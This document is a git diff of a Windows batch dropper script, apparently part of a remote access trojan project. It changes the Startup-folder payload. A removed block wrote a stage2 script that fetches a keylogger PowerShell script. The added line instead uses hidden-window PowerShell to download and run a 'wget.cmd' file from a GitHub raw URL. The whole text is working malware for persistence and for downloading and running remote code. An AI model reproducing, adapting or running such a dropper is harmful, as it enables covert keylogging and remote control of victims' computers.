@@ -9,15 +9,12 @@ set "STARTUP=%C:/Users/%username%/AppData/Roaming/Microsoft/Windows/Start Menu/P
 @REM move into startup directory
 cd %STARTUP%
 @REM writeS payload to startup
-(
-    
-    echo powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri raw.githubusercontent.com/lukeeeeeee335/RAT/main/resources/keylogger.ps1 -OutFile p.ps1"
-    echo pause
-) > stage2.cmd
+powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri raw.githubusercontent.com/lukeeeeeee335/RAT/main/files/wget.cmd -OutFile wget.cmd"
+
 
 @REM run payload placeholder
-powershell ./stage2.cmd
+powershell ./wget.cmd
 
 
 cd %initialPath%
-del init.cmd
+@REM del init.cmd
